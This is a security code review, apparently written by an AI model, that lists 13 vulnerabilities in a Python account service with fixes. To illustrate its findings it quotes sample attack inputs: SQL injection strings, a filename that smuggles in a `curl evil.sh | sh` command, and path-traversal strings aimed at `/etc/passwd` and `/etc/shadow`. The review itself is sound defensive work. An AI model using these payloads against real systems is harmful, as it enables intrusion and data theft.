@@ -1,0 +1,55 @@
+I found 13 security issues in `account_service.py`, listed from most to least severe. Four are critical: SQL injection, command injection, path traversal and a hard-coded secret.
+
+### Critical
+
+**1. SQL injection, line 34**
+`find_by_username` puts `username` straight into the SQL string. Because it backs `verify_credentials` (line 55), it's reachable from the login form before the user is authenticated. A username like `' OR '1'='1' --` returns the first account, and `' UNION SELECT ...` can pull any data out of the database.
+*Fix:* use a parameterized query: `WHERE username = ?`, `(username,)`.
+
+**2. Command injection, lines 120–122**
+`filename` is put into a shell command and run with `shell=True`. A filename like `x; curl evil.sh | sh` runs arbitrary commands on the server.
+*Fix:* pass the arguments as a list and drop `shell=True`.
+
+**3. Path traversal and arbitrary file read, lines 119 and 126**
+`os.path.join(EXPORT_DIR, filename)` doesn't restrict where the path ends up. `../../etc/passwd` escapes the export folder, and an absolute path like `/etc/shadow` replaces the base path entirely. Line 126 then reads that file and returns it to the caller. With `check=False` (line 124), a failed export still goes on to read whatever is at that path.
+*Fix:* generate the filename on the server, or check `os.path.realpath(dest)` starts with `EXPORT_DIR + os.sep`. Check the subprocess result before reading.
+
+**4. Hard-coded live secret, line 19**
+`SIGNING_KEY = "sk_live_..."` is in source code, so anyone with repo access has it. Rotating it would also invalidate every stored password hash, because line 75 mixes it into the hashes.
+*Fix:* load it from a secrets manager or environment variable, rotate the exposed key, and keep it separate from password hashing.
+
+### High
+
+**5. Missing authorization check (IDOR) in `update_profile`, lines 83–100**
+`session_user_id` is accepted but never used, so any logged-in user can change any account's `email`. Changing the email and then requesting a password reset lets them take over the account.
+*Fix:* require `session_user_id == target_user_id` or an admin role, as `deactivate_account` does.
+
+**6. Missing authorization check (IDOR) in `get_profile`, lines 103–114**
+`session_user_id` is also ignored here, so any user can read any other user's email and role.
+
+**7. No authorization in `export_account_data`, line 117**
+The function takes no session user at all, so whoever can call it can export any user's data.
+
+**8. Plaintext passwords written to logs, lines 60–65**
+Every successful login logs the password in clear text.
+*Fix:* remove `password` from the log line.
+
+**9. Weak password hashing, line 75**
+Passwords are hashed with a single round of SHA-256, a fast hash that's easy to brute-force. There's no per-user salt, only one shared secret, so two users with the same password get the same hash.
+*Fix:* use bcrypt, scrypt or argon2 (or `hashlib.scrypt`/`pbkdf2_hmac` with a random salt per user).
+
+### Medium / Low
+
+**10. Hash comparison isn't constant-time, line 59**
+`==` can leak timing information. Use `hmac.compare_digest`. A proper password library's verify function handles this for you.
+
+**11. Username enumeration by timing, lines 55–57**
+When the user doesn't exist, the function returns before hashing anything. That response is measurably faster, so an attacker can tell which usernames exist. Run a dummy hash on that path too.
+
+**12. Limit can be bypassed in `list_recent_signups`, lines 132–133**
+Only the upper bound is checked. In SQLite, a negative `limit` such as `-1` means no limit, so this returns every row. `days` isn't bounded either, and there's no authorization check. Clamp both values, e.g. `limit = max(1, min(limit, 1000))`.
+
+**13. Deactivated accounts still have their privileges, lines 157–161**
+`find_by_id` doesn't check `active`, so a deactivated admin can still deactivate other accounts unless the session middleware blocks them. Add `AND active = 1` to the query, or check it here.
+
+**General note:** the module docstring (lines 4–5) relies on the session middleware for security. That middleware only proves the caller is logged in. It doesn't check *which* account they're allowed to act on, which is why issues 5–7 need their own ownership or role checks.
